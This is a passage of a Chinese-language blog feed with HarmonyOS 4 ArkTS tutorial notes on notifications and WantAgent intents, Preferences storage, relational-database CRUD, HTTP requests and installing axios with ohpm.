</span><br><span class="line"><span class="comment">// 当前系统不支持进度条模板  </span></span><br><span class="line"><span class="keyword">return</span>  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><ol start="2"><li>定义通知请求</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.1 通知模板</span></span><br><span class="line"><span class="keyword">let</span> template = &#123;  </span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;downloadTemplate&#x27;</span>,  <span class="comment">//模板名称，必须是downloadTemplate</span></span><br><span class="line"><span class="attr">data</span>: &#123;  </span><br><span class="line">  <span class="attr">progressValue</span>: <span class="variable language_">this</span>.<span class="property">progressValue</span>,  <span class="comment">//当前进度</span></span><br><span class="line">  <span class="attr">progressMaxValue</span>: <span class="variable language_">this</span>.<span class="property">progressMaxValue</span>  <span class="comment">//进度最大值</span></span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 3.2 通知请求</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">request</span>: notify.<span class="property">NotificationRequest</span> = &#123;  </span><br><span class="line"><span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">notificationId</span>,  <span class="comment">//尽量使用固定id，不同操作需要使用通过id</span></span><br><span class="line"><span class="attr">template</span>: template,  <span class="comment">// 导入模板</span></span><br><span class="line"><span class="attr">wantAgent</span>: <span class="variable language_">this</span>.<span class="property">wantAgentInstance</span>,  </span><br><span class="line"><span class="attr">content</span>: &#123;  <span class="comment">//通知内容</span></span><br><span class="line">  <span class="attr">contentType</span>: notify.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_BASIC_TEXT</span>,  </span><br><span class="line">  <span class="attr">normal</span>: &#123;  </span><br><span class="line"><span class="attr">title</span>: <span class="variable language_">this</span>.<span class="property">filename</span> + <span class="string">&#x27;:  &#x27;</span> + <span class="variable language_">this</span>.<span class="property">state</span>,  </span><br><span class="line"><span class="attr">text</span>: <span class="string">&#x27;&#x27;</span>,  </span><br><span class="line"><span class="attr">additionalText</span>: <span class="variable language_">this</span>.<span class="property">progressValue</span> + <span class="string">&#x27;%&#x27;</span>  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 3.发送通知  </span></span><br><span class="line">notify.<span class="title function_">publish</span>(request)  </span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;通知发送成功&#x27;</span>))  </span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;通知发送失败！&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(reason)))  </span><br></pre></td></tr></table></figure><ul><li>在每一次任务进度变更都发送一次通知，实现进度条的变化，所有id不能变</li></ul><h1 id="通知意图"><a href="#通知意图" class="headerlink" title="通知意图"></a>通知意图</h1><p>我们可以给通知或其中的按钮设置的行为意图（Want）， 从而实现拉起应用组件或发布公共事件等能力。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 意图行为信息</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">wantInfo</span>: wantAgent.<span class="property">WantAgentInfo</span> = &#123;  </span><br><span class="line"><span class="attr">wants</span>: [  </span><br><span class="line">&#123;  <span class="comment">//要拉起的是哪个，是个数组，可以有多个</span></span><br><span class="line"><span class="attr">device</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="attr">bundleName</span>: <span class="string">&#x27;com.example.myapplication&#x27;</span>,  <span class="comment">//bundleName，每个应用的标识</span></span><br><span class="line"><span class="attr">abilityName</span>: <span class="string">&#x27;EntryAbility&#x27;</span>,  <span class="comment">//页面abilityName</span></span><br><span class="line"><span class="attr">action</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="attr">entities</span>: []</span><br><span class="line">&#125;  </span><br><span class="line">],  </span><br><span class="line"><span class="attr">requestCode</span>: <span class="number">0</span>,  <span class="comment">//请求参数码</span></span><br><span class="line"><span class="attr">operationType</span>: wantAgent.<span class="property">OperationType</span>.<span class="property">START_ABILITY</span>,  <span class="comment">//枚举，START_ABILITY启动</span></span><br><span class="line"><span class="attr">wantAgentFlags</span>: [wantAgent.<span class="property">WantAgentFlags</span>.<span class="property">CONSTANT_FLAG</span>]  <span class="comment">//标识，CONSTANT_FLAG表示行为意图不可变</span></span><br><span class="line"><span class="comment">//wantAgentFlags是个数组，可以有多个</span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 2. 创建wantAgent实例  </span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">wantAgentInstance</span> = <span class="keyword">await</span> wantAgent.<span class="title function_">getWantAgent</span>(wantInfo)</span><br><span class="line"><span class="comment">// 3. 通知请求</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">request</span>: notify.<span class="property">NotificationRequest</span> = &#123;  </span><br><span class="line"><span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">notificationId</span>,  </span><br><span class="line"><span class="attr">template</span>: template,  </span><br><span class="line"><span class="attr">wantAgent</span>: <span class="variable language_">this</span>.<span class="property">wantAgentInstance</span>,  <span class="comment">//设置通知意图</span></span><br><span class="line"><span class="attr">content</span>: &#123;  </span><br><span class="line"><span class="comment">//通知内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>关于wantAgent的详细内容可以参考<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references-V3/js-apis-inner-wantagent-wantagentinfo-0000001428061912-V3">鸿蒙开发文档</a></li><li>关于WantAgentFlags的相关枚举可以参考<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-references-V3/js-apis-app-ability-wantagent-0000001493424324-V3#ZH-CN_TOPIC_0000001573928753__wantagentflags">鸿蒙开发文档</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-数据持久化</title>
      <link href="/2024/01/15/%E9%B8%BF%E8%92%99HarmonyOS%204-%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2024/01/15/%E9%B8%BF%E8%92%99HarmonyOS%204-%E6%95%B0%E6%8D%AE%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="用户首选项"><a href="#用户首选项" class="headerlink" title="用户首选项"></a>用户首选项</h1><ul><li>用户首选项（Preference）为应用提供<code>Key-Value</code>键值型的数据处理能力，支持应用持久化轻量级数据。</li><li>轻量化数据指的是结构简单，能够用<code>Key-Value</code>表示，同时占用内存小的数据</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114205222.png" alt="image.png"></p><ol><li>导入首选项模块<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dataPreference <span class="keyword">from</span> <span class="string">&#x27;@ohos.data.preferences&#x27;</span></span><br></pre></td></tr></table></figure></li><li>获取首选项实例，读取指定文件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">datePreference.<span class="title function_">getPreferences</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="string">&#x27;MyAppPreferences&#x27;</span>)<span class="comment">//UIAbility和Preferences实例名称</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">preferences</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//获取成功</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//获取失败</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li>数据操作<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.1 写入数据，如果已经存在则覆盖，可利用.has()判断是否存在</span></span><br><span class="line"><span class="title class_">Preferences</span>.<span class="title function_">put</span>(<span class="string">&#x27;key&#x27;</span>, val)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> preferences.<span class="title function_">flush</span>()) <span class="comment">//刷到磁盘</span></span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)  <span class="comment">//异常处理</span></span><br><span class="line"><span class="comment">// 3.2 删除数据</span></span><br><span class="line">preferences.<span class="title function_">delete</span>(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"><span class="comment">// 3.3 查询数据</span></span><br><span class="line">preferences.<span class="title function_">get</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;defaultValue&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;查询成功&#x27;</span>))</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;查询失败&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br>Key为string类型，要求非空且长度不超过80字节<br>Value可以是string、number、boolean以及以上类型数组，大小不超过8192字节<br>数据量建议不超过一万条</p></blockquote></li></ol><h2 id="加载实例"><a href="#加载实例" class="headerlink" title="加载实例"></a>加载实例</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114211937.png" alt="image.png"></p><ul><li>上图为异步写法</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114212336.png" alt="image.png"></p><ul><li>上图为同步写法，定义方法为<code>async</code>，然后在<code>promise</code>值前加上<code>await</code>，等待<code>promise</code>结果。</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114223857.png" alt="image.png"></p><ul><li>如果写在其他文件记得导出</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114214515.png" alt="image.png"></p><ul><li>在启动应用时加载数据，在<code>EntryAbility.ts</code>文件中的<code>onCreate()</code>钩子当中添加</li><li>同时加上<code>async</code>和<code>await</code>同步操作</li></ul><h2 id="读写实例"><a href="#读写实例" class="headerlink" title="读写实例"></a>读写实例</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114213026.png" alt="image.png"></p><ul><li>写入方法的参数包括<code>Preference</code>实例名称、<code>Key</code>和<code>value</code></li><li>先判断是否存在，然后写入数据</li><li>等待刷盘</li><li>也可以添加<code>try catch</code>获取异常</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114213522.png" alt="image.png"></p><ul><li>读取方法的参数包含<code>Preference</code>实例名称、<code>Key</code>和默认值<code>defaultValue</code></li><li>先判断是否存在，再读取数据</li><li>直接<code>return</code>返回数据</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在打开页面时读取数据</span></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">aboutToAppear</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">fontSize</span> = <span class="keyword">await</span> <span class="title class_">PreferencesUtil</span>.<span class="title function_">getPreferenceValue</span>(<span class="string">&#x27;MyPreferences&#x27;</span>, <span class="string">&#x27;IndexFontSize&#x27;</span>, <span class="number">16</span>) <span class="keyword">as</span> <span class="built_in">number</span></span><br><span class="line"><span class="comment">//as number 的作用是指定返回值为数字</span></span><br><span class="line">&#125;<span class="comment">//写为同步操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写入数据</span></span><br><span class="line"><span class="title class_">PreferencesUtil</span>.<span class="title function_">putPreferenceValue</span>(<span class="string">&#x27;MyPreferences&#x27;</span>, <span class="string">&#x27;IndexFontSize&#x27;</span>, val)</span><br></pre></td></tr></table></figure><ul><li>在预览器不能使用<code>preference</code>，所以需要使用鸿蒙设备或者模拟器打开预览。</li></ul><h1 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h1><ul><li>关系型数据库（RDB）是基于SQLite组件提供的本地数据库，用于管理应用中的结构化数据。例如记账本、备忘录。</li></ul><h2 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h2><ol><li>导入关系型数据库模块</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> relationalStore <span class="keyword">from</span> <span class="string">&#x27;@ohos.data.relationalStore&#x27;</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li>初始化数据库表</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 rdb配置</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;MyApplication.db&#x27;</span>,  <span class="comment">//数据库文件名</span></span><br><span class="line"><span class="attr">securityLevel</span>: relationalStore.<span class="property">SecurityLevel</span>.<span class="property">S1</span>  <span class="comment">//数据库安全级别</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 初始化表的SQL</span></span><br><span class="line"><span class="keyword">const</span> sql = <span class="string">&#x27;CREATE TABLE IF NOT EXISTS TASK (</span></span><br><span class="line"><span class="string">ID INTEGER PRIMARY KEY,</span></span><br><span class="line"><span class="string">NAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">FINISHED bit</span></span><br><span class="line"><span class="string">)&#x27;</span></span><br><span class="line"><span class="comment">// 2.3 获取rdb</span></span><br><span class="line">relationalStore.<span class="title function_">getRdbStore</span>(<span class="variable language_">this</span>.<span class="property">context</span>, config, <span class="function">(<span class="params">err, rdbStore</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 2.4 执行sql，后续的增删改查都是使用rdbStore对象</span></span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line"> <span class="comment">//错误日志</span></span><br><span class="line"> <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">rdbStore.<span class="title function_">executeSql</span>(sql)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>为了方便使用，可以将<code>rdbStore</code>添加到成员变量当中</li></ul><h2 id="增、删、改数据"><a href="#增、删、改数据" class="headerlink" title="增、删、改数据"></a>增、删、改数据</h2><ol><li>新增数据</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.1 准备数据</span></span><br><span class="line"><span class="keyword">let</span> task = &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;任务1&#x27;</span>, <span class="attr">finished</span>: <span class="literal">false</span>&#125;;</span><br><span class="line"><span class="comment">// 1.2 新增</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rdbStore</span>.<span class="title function_">insert</span>(<span class="variable language_">this</span>.<span class="property">tableName</span>, task)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240115153509.png" alt="image.png"></p><ul><li>将返回值设定为<code>promise</code>，是个<code>id</code>，这样就可以直接使用来调取这个数据了。</li></ul><ol start="2"><li>修改</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 要更新的数据</span></span><br><span class="line"><span class="keyword">let</span> task = &#123;<span class="string">&#x27;finished&#x27;</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"><span class="comment">// 2.2 查询条件，RdbPredicates就是条件谓词</span></span><br><span class="line"><span class="keyword">let</span> predicates = <span class="keyword">new</span> relationalStore.<span class="title class_">RdbPredicates</span>(<span class="variable language_">this</span>.<span class="property">tableName</span>)</span><br><span class="line">predicates.<span class="title function_">equalTo</span>(<span class="string">&#x27;ID&#x27;</span>, id)</span><br><span class="line"><span class="comment">// 2.3 执行更新</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rdbStore</span>.<span class="title function_">update</span>(task, predicates)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240115154024.png" alt="image.png"></p><ul><li>同样是返回一个<code>promise</code>，让调用的地方去处理</li></ul><ol start="3"><li>删除</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.1 查询条件</span></span><br><span class="line"><span class="keyword">let</span> predicates = <span class="keyword">new</span> relationalStore.<span class="title class_">RdbPredicates</span>(<span class="variable language_">this</span>.<span class="property">tableName</span>)</span><br><span class="line">predicates.<span class="title function_">equalTo</span>(<span class="string">&#x27;ID&#x27;</span>, id)</span><br><span class="line"><span class="comment">// 3.2 执行删除</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">rdbStore</span>.<span class="title function_">delete</span>(predicates)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240115154156.png" alt="image.png"></p><ul><li>与修改方法差不多</li></ul><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><ol><li>查询数据</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.1 查询条件</span></span><br><span class="line"><span class="keyword">let</span> predicates = <span class="keyword">new</span> relationalStore.<span class="title class_">RdbPredicates</span>(<span class="variable language_">this</span>.<span class="property">tableName</span>)</span><br><span class="line"><span class="comment">// 1.2 执行查询</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">rdbStore</span>.<span class="title function_">query</span>(predicates, [<span class="string">&#x27;ID&#x27;</span>, <span class="string">&#x27;NAME&#x27;</span>, <span class="string">&#x27;FINISHED&#x27;</span>])</span><br></pre></td></tr></table></figure><ol start="2"><li>解析结果</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 准备数组保存结果</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">tasks</span>: <span class="built_in">any</span>[] = []</span><br><span class="line"><span class="comment">// 2.2 循环遍历结果集，判断是否结果是否遍历到最后一行</span></span><br><span class="line"><span class="keyword">while</span>(!result.<span class="property">isAlLastRow</span>)&#123;</span><br><span class="line"><span class="comment">//指针移动到下一行数据，默认在-1行</span></span><br><span class="line">result.<span class="title function_">goToNextRow</span>()</span><br><span class="line"><span class="comment">//根据字段名获取字段index，从而获取字段值</span></span><br><span class="line"><span class="keyword">let</span> id = result.<span class="title function_">getLong</span>(result.<span class="title function_">getColumnIndex</span>(<span class="string">&#x27;ID&#x27;</span>))</span><br><span class="line"><span class="keyword">let</span> name = result.<span class="title function_">getString</span>(result.<span class="title function_">getColumnIndex</span>(<span class="string">&#x27;NAME&#x27;</span>))</span><br><span class="line"><span class="keyword">let</span> finished = result.<span class="title function_">getLong</span>(result.<span class="title function_">getColumnIndex</span>(<span class="string">&#x27;FINISHED&#x27;</span>))</span><br><span class="line">task.<span class="title function_">push</span>(&#123;id, name, <span class="attr">finished</span>: !!finished&#125;)  <span class="comment">//加入到数组当中</span></span><br><span class="line"><span class="comment">//传入的finished是数字型，通过两次取反可以变成布尔型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240115150721.png" alt="image.png"></p><ul><li>最后<code>return</code>数组，是个<code>promise</code>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-网络连接</title>
      <link href="/2024/01/14/%E9%B8%BF%E8%92%99HarmonyOS%204-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/"/>
      <url>/2024/01/14/%E9%B8%BF%E8%92%99HarmonyOS%204-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="http请求数据"><a href="#http请求数据" class="headerlink" title="http请求数据"></a>http请求数据</h1><ol><li>导入http模块<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http <span class="keyword">from</span> <span class="string">&#x27;@ohos.net.http&#x27;</span></span><br></pre></td></tr></table></figure></li><li>是用http模块发生请求，处理响应<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 创建一个http的请求对象，不可复用</span></span><br><span class="line"><span class="keyword">let</span> httpRequest = http.<span class="title function_">createHttp</span>()</span><br><span class="line"><span class="comment">// 2.2 发生网络请求</span></span><br><span class="line">httpRequest.<span class="title function_">request</span>(</span><br><span class="line"><span class="string">&#x27;http://localhost:3000/users&#x27;</span>,  <span class="comment">//请求URL路径</span></span><br><span class="line">&#123;  <span class="comment">//请求选项HttpRequestOptions</span></span><br><span class="line"><span class="attr">method</span>: http.<span class="property">RequestMethod</span>.<span class="property">GET</span>,</span><br><span class="line"><span class="attr">extraData</span>: &#123;<span class="string">&#x27;param1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>&#125;  <span class="comment">//k1=v1&amp;k2=v2</span></span><br><span class="line">&#125;</span><br><span class="line">)  <span class="comment">//Promise：存放未来会完成的结果</span></span><br><span class="line"><span class="comment">// 2.3 处理响应结果</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function">(<span class="params">resp: http.HttpRequest</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(resp.<span class="property">responseCode</span> === <span class="number">200</span>)&#123;</span><br><span class="line"><span class="comment">//请求成功</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function">(<span class="params">err: <span class="built_in">Error</span></span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//请求失败</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><ul><li>HttpRequestOptions</li></ul><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>method</td><td>RequestMethod</td><td>请求方式，GET、POST、PUT、DELETE等</td></tr><tr><td>extraDate</td><td>string|Object</td><td>请求参数</td></tr><tr><td>header</td><td>Object</td><td>请求头字段</td></tr><tr><td>connectTimeout</td><td>number</td><td>连接超时时间，单位毫秒，默认为60000ms</td></tr><tr><td>readTimeout</td><td>number</td><td>读取超时间，同上</td></tr></tbody></table><ul><li>HttpResponse</li></ul><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>responseCode</td><td>ResponseCode</td><td>响应状态码</td></tr><tr><td>header</td><td>Object</td><td>响应头</td></tr><tr><td>cookies</td><td>string</td><td>响应返回的cookies</td></tr><tr><td>result</td><td>string|Object</td><td>响应体，默认是json字符串</td></tr><tr><td>resultType</td><td>HttpDateType</td><td>返回值类型</td></tr></tbody></table><ul><li>以下是实例</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114145627.png" alt="image.png"></p><ul><li>封装的方法和类</li><li>网络请求是有延迟的，所有使用promise异步处理，获取将来的结果</li><li>request返回的是promise，所有整个函数返回的也该是promise</li><li>resolve是成功的通知，reject是失败的通知</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114153138.png" alt="image.png"></p><ul><li>创建对象并导出，在使用时调入</li><li>也需要<code>.then</code>来处理结果</li><li>最后一行的concat的作用是将原来的列表和新获取的进行拼接，实现每次获取都能在后面添加</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114152948.png" alt="image.png"></p><ul><li>触底继续获取的方法</li><li>通过isLoading参数将回弹造成的两次触底进行抵消，并且翻页继续获取列表</li><li>在获取完列表后idLoading被重新设置为false</li><li>isMode参数的作用是检查是否还有数据可以获取</li></ul><h1 id="第三方库axios"><a href="#第三方库axios" class="headerlink" title="第三方库axios"></a>第三方库axios</h1><h2 id="下载和安装ohpm"><a href="#下载和安装ohpm" class="headerlink" title="下载和安装ohpm"></a>下载和安装ohpm</h2><ol><li>下载和安装ohpm（open harmony package manager），鸿蒙第三方库的包管理工具</li><li><a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/ide-command-line-ohpm-0000001490235312-V3">下载地址和官方文档</a></li><li>下载安装，并按照官方文档进行环境变量的配置</li></ol><h2 id="下载和安装axios"><a href="#下载和安装axios" class="headerlink" title="下载和安装axios"></a>下载和安装axios</h2><ul><li><a href="https://ohpm.openharmony.cn/#/cn/detail/@ohos%2Faxios">第三方文档axios说明</a></li></ul><ol><li>下载axios<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入项目目录，然后输入下面命令</span></span><br><span class="line">ohpm install @ohos/axios</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114155645.png" alt="image.png"></li></ol><ul><li>在oh-package.json5文件当中可以看到所有第三方库依赖</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240114155802.png"><br>2. 开放网络权限</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 